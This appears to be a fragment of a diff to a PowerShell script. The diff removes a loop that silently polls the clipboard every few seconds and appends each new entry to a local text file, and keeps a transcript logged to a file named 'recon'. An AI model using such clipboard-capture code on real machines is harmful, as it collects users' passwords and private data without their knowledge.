@@ -1,38 +1,3 @@
-$pclip = ""
- $array = @()
- $counter = 0
-
-
-
-    while($true){
-
-$cclip = Get-Clipboard
-
-
-        if ($pclip -eq $cclip){
-
-        #Do Nothing
-        
-        } else {
-
-
-        $array += $cclip
-        $pclip = $cclip
-        $cclip = Get-Clipboard
-
-
-        $counter++
-
-            if ($filechoice -eq 1){
-
-            $pclip >> C:\Temp\file.txt
-
-            }
-
-        }
-        Start-Sleep -Seconds 5
-        }
-        
 
 Start-Transcript -Path "C:\temp\recon.txt" -NoClobber
 
